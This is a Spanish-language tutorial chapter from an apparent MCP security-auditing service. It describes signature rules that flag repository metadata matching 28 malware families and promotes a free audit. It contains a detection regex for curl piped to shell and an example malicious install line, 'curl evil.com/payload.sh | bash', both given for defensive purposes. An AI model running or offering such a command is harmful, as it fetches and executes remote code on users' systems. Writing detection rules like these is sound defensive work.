# MCP Security 101: Capítulo 4 — 28 firmas de familias de malware

L1.8 detecta metadatos que coinciden con familias de malware conocidas: Emotet, LockBit, Cobalt Strike, Mimikatz, RedLine, y 23 más.

## Cómo funciona

Cada firma es un patrón de comportamiento en los metadatos del repo (no en el código fuente). Similar a YARA pero para metadatos de repos:

```yaml
# Ejemplo simplificado de una firma
- name: "Emotet_Indicator"
  patterns:
    - "Download Latest Release"  # badge pointing to external zip
    - "run this command to install"  # suspicious install instructions
    - regex: "curl.*\|.*sh.*\|.*bash"  # curl pipe to shell
  severity: critical
  family: Emotet
```

## Las 28 familias detectadas

| Familia | Tipo | Patrones |
|---------|------|---------|
| Emotet | Trojan/banker | Download badges, obfuscated URLs |
| LockBit | Ransomware | Encrypted file detection, .lockbit extension |
| LockBit 3.0 | Ransomware | Updated signatures |
| Cobalt Strike | C2 framework | Beacon configs, named pipes |
| Mimikatz | Credential theft | LSASS access, sekurlsa |
| RedLine | Stealer | Browser data exfil, config files |
| Atomic Stealer | macOS stealer | Keychain access, browser cookies |
| DarkGate | Trojan | AutoIt scripts, obfuscated payloads |
| IcedID | Banking trojan | Shellcode injection, GZipLoader |
| BumbleBee | Loader | Cobalt Strike loader, obfuscated DLLs |
| Pikabot | Loader | JS execution, obfuscated VBScript |
| ChromeLoader | Browser hijacker | Malicious browser extensions |
| BanLoader | Loader | DLL sideloading, encrypted payloads |
| Rhysida | Ransomware | Encrypted file detection |
| BlackBasta | Ransomware | Lateral movement indicators |
| Cl0p | Ransomware | Go binary indicators |
| + 12 más | — | — |

## Por qué importa para MCP

Un MCP server puede parecer legítimo pero contener patrones de comportamiento que coinciden con malware conocido. Por ejemplo:

- Un "install" command que hace `curl evil.com/payload.sh | bash` → coincide con Emotet
- Un README que te dice "download the latest release from this external link" → coincide con ChromeLoader
- Un package.json con un postinstall que descarga un binario → coincide con BanLoader

## Auditoría gratis

```bash
curl -X POST https://marketnow.site/api/submit-skill \
  -H "Content-Type: application/json" \
  -d '{"repo_url": "https://github.com/your-username/your-mcp-server"}'
```

L1.8 corre sincrónicamente. Si detecta una firma, el submission se rechaza inmediatamente.

## Próximo capítulo

**Capítulo 5**: Monitoreo continuo (L3) — cómo detectamos drift después de la auditoría

---

*Audita gratis: https://marketnow.site/submit*
